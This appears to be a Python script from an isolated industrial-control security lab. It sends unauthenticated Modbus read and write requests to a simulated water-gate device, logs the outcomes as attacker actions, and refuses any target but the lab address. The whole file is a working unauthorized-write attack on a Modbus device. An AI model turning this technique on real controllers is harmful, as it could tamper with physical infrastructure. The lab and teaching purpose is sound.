import argparse
import socket
import struct
from scapy.contrib.modbus import ModbusADURequest, ModbusPDU06WriteSingleRegisterRequest, ModbusPDU04ReadInputRegistersRequest
from shared.logging_utils import log

LAB_IP = "172.28.10.20"
LAB_PORT = 5020

def validate_target(target, port):
    if target not in ("device", LAB_IP) or port != LAB_PORT:
        raise ValueError("Only device / 172.28.10.20 on port 5020 is allowed")
    addresses = {item[4][0] for item in socket.getaddrinfo(target, port, type=socket.SOCK_STREAM)}
    if addresses != {LAB_IP}:
        raise ValueError("Lab hostname resolved outside the configured device")
    return LAB_IP

def parser(write=False):
    p = argparse.ArgumentParser(description="Explicit isolated-lab Modbus request")
    p.add_argument("--target", default="device")
    p.add_argument("--port", type=int, default=5020)
    if write:
        p.add_argument("--gate", type=int, choices=range(101), default=100, metavar="0..100")
    return p

def make_request(gate=None):
    pdu = ModbusPDU04ReadInputRegistersRequest(startAddr=0, quantity=2) if gate is None else ModbusPDU06WriteSingleRegisterRequest(registerAddr=0, registerValue=gate)
    return bytes(ModbusADURequest(transId=0xA001, protoId=0, unitId=1) / pdu)

def exact(sock, count):
    data = b""
    while len(data) < count:
        part = sock.recv(count - len(data))
        if not part:
            raise ConnectionError("Truncated Modbus response")
        data += part
    return data

def exchange(host, port, request):
    with socket.create_connection((host, port), timeout=3) as sock:
        sock.sendall(request)
        header = exact(sock, 7)
        tid, pid, length, unit = struct.unpack("!HHHB", header)
        if (tid, pid, unit) != (0xA001, 0, 1) or not 2 <= length <= 254:
            raise ValueError("Invalid MBAP response")
        body = exact(sock, length - 1)
        if body[0] & 0x80:
            raise ValueError(f"Modbus exception {body.hex()}")
        if request[7] == 6 and header + body != request:
            raise ValueError("Invalid write echo")
        if request[7] == 4 and (len(body) != 6 or body[:2] != bytes([4, 4])):
            raise ValueError("Invalid read response")
        return body

def run(write=False):
    args = parser(write).parse_args()
    try:
        host = validate_target(args.target, args.port)
        request = make_request(args.gate if write else None)
        body = exchange(host, args.port, request)
        fields = dict(gate=args.gate) if write else dict(zip(("water_level_encoded", "actual_gate"), struct.unpack("!HH", body[2:])))
        log("ATTACKER", "unauthorized_write_accepted" if write else "unauthorized_read_succeeded", target=host, request_hex=request.hex(), response_hex=body.hex(), **fields)
    except (ValueError, OSError) as exc:
        log("ATTACKER", "request_failed", error=str(exc))
        raise SystemExit(1)
